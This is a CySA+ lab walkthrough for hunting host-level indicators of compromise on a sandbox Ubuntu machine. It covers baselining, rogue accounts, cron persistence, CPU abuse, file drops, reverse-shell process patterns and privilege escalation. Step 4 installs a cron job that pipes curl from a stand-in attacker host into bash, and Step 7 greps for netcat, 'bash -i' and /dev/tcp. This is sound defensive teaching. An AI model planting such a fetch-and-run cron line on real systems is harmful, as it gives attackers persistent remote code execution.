# Lab 5 — Host-Based IOC Hunting

In this lab you will hunt host-level indicators of compromise: unauthorised processes, unauthorised scheduled tasks, new accounts, file-system anomalies, and abnormal CPU/memory consumption. These are exam-blueprint items under CySA+ 1.2 (Host-related, Application-related, and Other indicators).

Run all commands on the Killercoda Ubuntu Playground:
https://killercoda.com/playgrounds/scenario/ubuntu

---

## Step 1 — Install tools

```bash
apt update && apt install -y auditd procps psmisc inotify-tools
```

---

## Step 2 — Baseline current state

You cannot spot the abnormal without first knowing the normal.

```bash
ps -ef > /tmp/baseline_ps.txt
ss -tulnp > /tmp/baseline_ss.txt
crontab -l > /tmp/baseline_cron.txt 2>/dev/null; cat /etc/crontab >> /tmp/baseline_cron.txt
cut -d: -f1 /etc/passwd > /tmp/baseline_users.txt
wc -l /tmp/baseline_*.txt
```

---

## Step 3 — Simulate unauthorised user creation (Application-related: "Introduction of new accounts")

```bash
useradd -m attacker
diff /tmp/baseline_users.txt <(cut -d: -f1 /etc/passwd)
```

The diff immediately surfaces the unauthorised account.

---

## Step 4 — Detect a malicious scheduled task (Host-related: "Unauthorized scheduled tasks")

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s http://evil.example/x | bash") | crontab -
diff /tmp/baseline_cron.txt <(crontab -l)
```

This is exactly what a persistence-stage attacker does.

---

## Step 5 — Detect abnormal process / CPU consumption (Host-related: "Processor consumption")

Spawn a CPU-burner that mimics a coinminer:

```bash
yes > /dev/null &
ps -eo pid,user,%cpu,%mem,cmd --sort=-%cpu | head
```

The `yes` process now dominates CPU. In a real hunt you would correlate this with the parent process and a hash of the executable (Lab 9).

---

## Step 6 — Detect file-system anomalies (Host-related: "File system changes or anomalies")

Watch a sensitive directory for unexpected writes:

```bash
inotifywait -m -r -e create,modify,delete /etc 2>/dev/null &
echo "x" > /etc/.evil
sleep 1
```

You will see the create event for `.evil`. Hidden dotfiles in `/etc`, `/tmp`, or `/dev/shm` are classic indicators.

---

## Step 7 — Detect malicious processes via parent / command line (Host-related: "Malicious processes")

A reverse shell often has `bash` as a child of a network listener:

```bash
ps -ef | awk '$3==1 && $NF ~ /sh$/ {print}'
ps -eo pid,ppid,user,cmd | grep -E 'nc|bash -i|/dev/tcp' | grep -v grep
```

Anything matching `bash -i`, `/dev/tcp/`, or netcat with a remote host is a high-confidence IOC.

---

## Step 8 — Detect unauthorised privilege escalation

```bash
grep -E 'sudo|su\b' /var/log/auth.log | tail
awk -F: '($3==0){print $1}' /etc/passwd
find / -perm -4000 -type f 2>/dev/null | head
```

Multiple UID-0 entries in `/etc/passwd`, new SUID binaries, or a flood of failed `sudo` attempts all qualify as "Unauthorized privileges".

---

## Step 9 — Clean up

```bash
kill %1 %2 2>/dev/null
crontab -r
userdel -r attacker 2>/dev/null
rm -f /etc/.evil
```

---

## What you learned
- The value of a baseline before hunting.
- How to detect new accounts, cron persistence, CPU abuse, file-system drops, suspicious process trees, and privilege escalation — each mapped to a CySA+ 1.2 indicator.
